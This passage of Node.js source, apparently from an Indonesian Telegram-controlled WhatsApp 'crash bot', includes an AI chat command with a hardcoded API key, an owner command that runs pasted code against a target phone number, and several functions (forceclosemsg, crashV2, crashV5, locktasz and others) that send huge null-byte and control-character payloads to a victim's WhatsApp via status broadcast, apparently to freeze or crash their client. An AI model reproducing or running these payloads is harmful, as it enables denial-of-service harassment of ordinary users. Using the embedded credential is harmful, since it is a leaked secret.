      headers: { Authorization: "Bearer sk-aea0067453d5c272-33fcd4-2c3e141d", "Content-Type": "application/json" },
      data: {
        model: "claude-opus-5",
        messages: [
          { role: "system", content: "Kamu adalah Zephyrine." },
          { role: "user", content: prompt }
        ],
        stream: true, max_tokens: 1024, temperature: 0.7
      },
      responseType: "stream", timeout: 60000
    });
    let fullText = "";
    res.data.on("data", function (chunk) {
      const lines = chunk.toString().split("\n");
      const first = lines[0];
      const jsonPart = first.slice(6);
      if (jsonPart === "[DONE]") return;
      try {
        const parsed = JSON.parse(jsonPart);
        const deltaText = parsed?.choices?.[0]?.delta?.content || "";
        if (deltaText) fullText += deltaText;
      } catch (e) {}
    });
    res.data.on("end", async function () {
      if (fullText.length > 4000) fullText = fullText.slice(0, 3900) + "\n\n... [dipotong]";
      await ctx.telegram.editMessageText(ctx.chat.id, loading.message_id, undefined,
        `${Q(`${CREWY_FONT}\n${E.robot()} 𝑪𝒍𝒂𝒖𝒅𝒆 (𝒁𝒆𝒑𝒉𝒚𝒓𝒊𝒏𝒆)`)}\n\n${fullText || "(kosong)"}`,
        { parse_mode: "HTML", disable_web_page_preview: true }
      ).catch(() => {});
    });
    res.data.on("error", async function (err) {
      await ctx.telegram.editMessageText(ctx.chat.id, loading.message_id, undefined, `${E.fail()} Error: ${err.message}`, { parse_mode: 'HTML' });
    });
  } catch (err) {
    await ctx.telegram.editMessageText(ctx.chat.id, loading.message_id, undefined, `${E.fail()} Gagal: ${err.message}`, { parse_mode: 'HTML' });
  }
});

bot.command("testfunction", checkOwner, async (ctx) => {
  try {
    const args = ctx.message.text.split(" ");
    if (args.length < 3) return ctx.reply(`${E.fail()} Format: <code>/testfunction 62xxxx 1</code> (reply function)`, { parse_mode: 'HTML' });
    const targetNum = args[1];
    const targetJid = targetNum.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.text) return ctx.reply(`${E.fail()} Reply dengan function`, { parse_mode: 'HTML' });
    const code = ctx.message.reply_to_message.text;
    const match = code.match(/async function\s+(\w+)/);
    if (!match) return ctx.reply(`${E.fail()} Function tidak valid`, { parse_mode: 'HTML' });
    const fnName = match[1];
    const vm = require("vm");
    const sandbox = { console, Buffer, sock, target: targetJid, sleep, generateWAMessageFromContent, prepareWAMessageMedia, proto, jidDecode };
    const vmContext = vm.createContext(sandbox);
    const fn = vm.runInContext(code + "\n" + fnName, vmContext);
    const arity = fn.length;
    if (arity === 1) await fn(targetJid);
    else if (arity === 2) await fn(sock, targetJid);
    else await fn(sock, targetJid, true);
    await ctx.reply(`${E.ok()} Function executed: ${fnName}`, { parse_mode: 'HTML' });
  } catch (err) {
    await ctx.reply(`${E.fail()} Error: ${err.message}`, { parse_mode: 'HTML' });
  }
});

bot.command("cekfunction", async (ctx) => {
  try {
    if (!ctx.message.reply_to_message) return ctx.reply(`${E.info()} Reply pesan kode JavaScript dengan /cekfunction`, { parse_mode: 'HTML' });
    const code = ctx.message.reply_to_message.text || ctx.message.reply_to_message.caption;
    if (!code || code.trim() === "") return ctx.reply(`${E.fail()} Tidak ada kode.`, { parse_mode: 'HTML' });
    let acorn;
    try { acorn = require("acorn"); }
    catch (_err) { return ctx.reply(`${E.fail()} Module acorn belum terinstall.\n<code>npm install acorn</code>`, { parse_mode: 'HTML' }); }
    try {
      acorn.parse(code, { ecmaVersion: "latest", sourceType: "module", locations: true });
      return ctx.reply(`${E.ok()} Sintaks valid. Tidak ditemukan error.`, { parse_mode: 'HTML' });
    } catch (parseErr) {
      const msg = parseErr.message;
      const errLine = parseErr.loc?.line || 0;
      const errCol = parseErr.loc?.column || 0;
      const lines = code.split("\n");
      const start = Math.max(1, errLine - 1);
      const end = Math.min(lines.length, errLine + 1);
      let snippet = "";
      for (let i = start; i <= end; i++) {
        const prefix = i === errLine ? "  >>" : "    ";
        snippet += prefix + " " + String(i).padStart(2, " ") + " | " + lines[i - 1] + "\n";
        if (i === errLine) snippet += "       " + " ".repeat(errCol) + "^\n";
      }
      return ctx.reply(`${E.fail()} ERROR DITEMUKAN\nLokasi: baris ${errLine}, kolom ${errCol}\nPesan: ${msg}\n\n<pre>${snippet}</pre>`, { parse_mode: 'HTML' });
    }
  } catch (err) {
    console.error(err);
    ctx.reply(`${E.fail()} Terjadi kesalahan internal.`, { parse_mode: 'HTML' });
  }
});

async function XtravsHardDelay(sock, target) {
  await safeRelay(sock, "status@broadcast", {
    conversation: "\u0000".repeat(50000)
  }, { statusJidList: [target], additionalNodes: [{ tag: "meta", attrs: {}, content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: target } }] }] }] });
}

async function forceclosemsg(sock, target) {
  const msg = generateWAMessageFromContent(target, {
    viewOnceMessage: { message: { interactiveResponseMessage: {
      body: { text: "\u0000".repeat(500000), format: "DEFAULT" },
      nativeFlowResponseMessage: { name: "call_permission_request", paramsJson: "\x10".repeat(500000), version: 3 }
    } } }
  }, { ephemeralExpiration: 0, forwardingScore: 9741, isForwarded: true });
  await safeRelay(sock, "status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [{ tag: "meta", attrs: {}, content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: target } }] }] }]
  });
}

async function BigIosSuport(sock, target) {
  await safeRelay(sock, "status@broadcast", {
    conversation: "\u0000".repeat(300000)
  }, { statusJidList: [target], additionalNodes: [{ tag: "meta", attrs: {}, content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: target } }] }] }] });
}

async function XmagicMachine(sock, target) {
  await safeRelay(sock, "status@broadcast", {
    conversation: "\u0000".repeat(100000)
  }, { statusJidList: [target], additionalNodes: [{ tag: "meta", attrs: {}, content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: target } }] }] }] });
}

async function crashV2(sock, target) {
  const msg = generateWAMessageFromContent(target, {
    viewOnceMessage: { message: { interactiveResponseMessage: {
      body: { text: "\u0000".repeat(200000), format: "DEFAULT" },
      nativeFlowResponseMessage: { name: "galaxy_message", paramsJson: "\x10".repeat(200000), version: 3 }
    } } }
  }, { ephemeralExpiration: 0, forwardingScore: 9741, isForwarded: true });
  await safeRelay(sock, "status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [{ tag: "meta", attrs: {}, content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: target } }] }] }]
  });
}

async function locktasz(sock, target) {
  const msg = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          title: "\0",
          body: { text: "\uFFFF" },
          nativeFlowMessage: { buttons: "\t".repeat(500000) }
        }
      }
    }
  };
  await safeSend(() => sock.relayMessage(target, msg, { participant: { jid: target } }));
}

async function crashV5(sock, target) {
  for (const name of ["call_permission_request", "galaxy_message"]) {
    const msg = generateWAMessageFromContent(target, {
      viewOnceMessage: { message: { interactiveResponseMessage: {
        body: { text: "\u0000", format: "DEFAULT" },
        nativeFlowResponseMessage: {
          name,
          paramsJson: "\x10".repeat(name === "galaxy_message" ? 145000 : 1045000),
          version: 3
        },
        entryPointConversionSource: "call_permission_message"
      } } }
    }, { ephemeralExpiration: 0, forwardingScore: 9741, isForwarded: true });
    await safeSend(() => sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta", attrs: {},
        content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: target } }] }]
      }]
    }));
  }
}

(async () => {
    const tokensUrl = "https://raw.githubusercontent.com/sinzy677/xdatabase/main/tokens.json";
    const botIdOk = await global.__SEC.verifyBotId(BOT_TOKEN, tokensUrl);
    if (!botIdOk) {
        console.log(chalk.red(`
    ▄▄▄▄
  ██▀▀▀▀█
 ██▀        ██▄████   ▄████▄  ██      ██ ▀██  ███
 ██         ██▀      ██▄▄▄▄██ ▀█  ██  █▀  ██▄ ██
 ██▄        ██       ██▀▀▀▀▀▀  ██▄██▄██    ████▀
  ██▄▄▄▄█   ██       ▀██▄▄▄▄█  ▀██  ██▀     ███
    ▀▀▀▀    ▀▀         ▀▀▀▀▀    ▀▀  ▀▀      ██
                                          ███
❌ ID BOT TIDAK TERDAFTAR DI DATABASE
Telegram owner: @MedyKillyou @pxsin
        `));
        setInterval(() => {}, 36000000);
        return;
    }

    console.log("\n🚀 Memulai sesi WhatsApp...");
    startSesi();
    console.log("Sukses connected");

    bot.launch().catch((err) => {
        if (err.message?.includes('409')) {
            console.log('⚠️ Conflict detected, waiting 5 seconds...');
            setTimeout(() => { console.log('🔄 Restarting bot...'); process.exit(1); }, 5000);
        }
    });

    setBotProfile(bot);

    console.log(chalk.bold.yellow(`

    ▄▄▄▄
  ██▀▀▀▀█
 ██▀        ██▄████   ▄████▄  ██      ██ ▀██  ███
 ██         ██▀      ██▄▄▄▄██ ▀█  ██  █▀  ██▄ ██
 ██▄        ██       ██▀▀▀▀▀▀  ██▄██▄██    ████▀
  ██▄▄▄▄█   ██       ▀██▄▄▄▄█  ▀██  ██▀     ███
    ▀▀▀▀    ▀▀         ▀▀▀▀▀    ▀▀  ▀▀      ██
                                          ███

Developer : @MedyKillyou
Creator Sec : @durovyatem
    `));

    startAutoUpdate();
})();